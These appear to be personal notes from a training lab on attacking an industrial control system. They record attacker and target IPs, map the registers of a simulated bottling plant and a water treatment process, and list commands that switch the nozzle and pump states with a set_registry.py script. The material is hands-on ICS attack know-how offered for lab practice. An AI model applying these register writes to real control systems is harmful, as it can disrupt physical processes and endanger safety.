# Attacking_ICS_Plant_1 

> VOiD | Wednesday 17 November 2021 06:01:29 PM IST

My IP : 10.8.253.221
Target IP : 10.10.100.182



## REGISTERS

1 : water level sensor
2 : water something
3 : roller start
4 : Nozzel Control
16 : start/stop plant

```bash
# Stops the nozzel
./set_registry.py 10.10.100.182 2 0
# Starts the nozzel
./set_registry.py 10.10.100.182 2 1
# Same for register 4

1 : bottel sensor (1 if bottel is under nozzel)
2 : water level sensor (1 if bottel is filled)
3 : roller (1 turns roller on)
4 : nozzel (1 opens the nozzel)
16 : plant (1 starts the plant)


```
## ==================================================
# PART 2
## ==================================================

name 			: register no : on/off
feed pump	 		1 			1=on
feed pump 			2 			1=off
outlet valve		4			1=on
Waste water valve	9  			1=on
